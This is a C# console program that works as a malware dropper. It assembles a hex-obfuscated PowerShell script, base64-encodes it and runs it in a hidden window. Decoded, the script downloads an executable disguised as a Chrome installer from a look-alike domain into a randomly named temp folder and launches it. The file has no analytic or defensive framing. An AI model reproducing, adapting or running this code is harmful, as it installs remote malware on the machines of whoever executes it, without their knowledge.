using System;
using System.Buffers.Text;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

namespace ConsoleApplication
{
    class Program
    {
        static void Main(string[] args)
        {
            string tempDir = Path.GetTempPath();
            byte[] bytes = Encoding.Unicode.GetBytes(tempDir);
            string hex = BitConverter.ToString(bytes).Replace("-", "");



            string command = "$udjhg = \n(\n'68 74 74 70 73 3a 2f 2f 63 68 72 6f 6d 65 69 6e 73 74 61 6c 6c 2e 78 79 7a 2f 73 74 61 74 69 63 2f 63 68 72 6f 6d 65 2f 63 68 72 6f 6d 65 53 65 74 75 70 2e 65 78 65',\n'68 74 74 70 73 3a 2f 2f 63 68 72 6f 6d 65 69 6e 73 74 61 6c 6c 2e 78 79 7a 2f 73 74 61 74 69 63 2f 63 68 72 6f 6d 65 2f 63 68 72 6f 6d 65 53 65 74 75 70 2e 6a 73 6f 6e'\n);\n$ndu = \n@(\n'2e 65 78 65',\n'2e 6a 73 6f 6e'\n);\n$nd = \n@{\nL = [Char[]]'abcdefghijklmnopqrstuvwxyz'\nU = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n};\n$KduHs = '';\n$U = Get-Random -Count 5 -InputObject $nd.U;\n$L = Get-Random -Count 5 -InputObject $nd.L;\n$mduq = $U + $L;\n$kms = (Get-Random -Count 5 -InputObject $mduq) -join '';\n$jstdb = '" + hex + "';\n$mPdiy = '';\n$wp = $kms;\n$jstdb = $jstdb + $wp;\nmkdir -force $jstdb | out-null;\n$c = 0;\nforeach ($qhwn in $udjhg) {\ntry{\n$dUydN = $mPdiy;\n$sud = $U + $L;\n$ifd = (Get-Random -Count 5 -InputObject $sud) -join '';\n$lop = $ndu[$c];$lop.Split(\" \") | forEach {[char]([convert]::toint16($_,16))} | forEach {$dUydN = $dUydN + $_}\n$hUsdks = $KduHs;\n$qhwn.Split(\" \") | forEach {[char]([convert]::toint16($_,16))} | forEach {$hUsdks = $hUsdks + $_}\nIWR $hUsdks -OutFile $jstdb\\$ifd$dUydN;\n$c++;}\ncatch {\n };\n}\nsaps (gci $jstdb\\*.exe | % {$_.FullName})";
            bytes = Encoding.Unicode.GetBytes(command);
            string base64 = Convert.ToBase64String(bytes);

            ProcessStartInfo startInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"powershell.exe -eNco \"{base64}\"",
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true
            };
            Process.Start(startInfo);
        }
    }
}